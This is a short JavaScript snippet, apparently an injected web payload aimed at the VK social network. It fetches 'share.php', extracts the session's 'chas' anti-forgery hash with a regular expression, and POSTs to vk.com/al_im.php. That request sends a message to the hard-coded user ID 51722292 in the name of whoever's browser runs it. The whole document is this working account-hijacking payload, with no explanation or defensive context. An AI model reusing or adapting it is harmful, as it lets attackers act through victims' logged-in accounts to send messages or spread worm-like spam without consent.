var x = new XMLHttpRequest;
x.open("GET", "share.php"), x.send(), x.onload = function(a) {
    var b = x.responseText.match(/chas: \'(.*?)\',/)[1];
    send(b);
};

function send(a) {
    var b = new XMLHttpRequest;
    b.open("POST", "https://vk.com/al_im.php"), b.send("act=a_send_box&al=1&from=share&media=share%3A0_0&to_ids=51722292&message=test&chas=" + a)
}
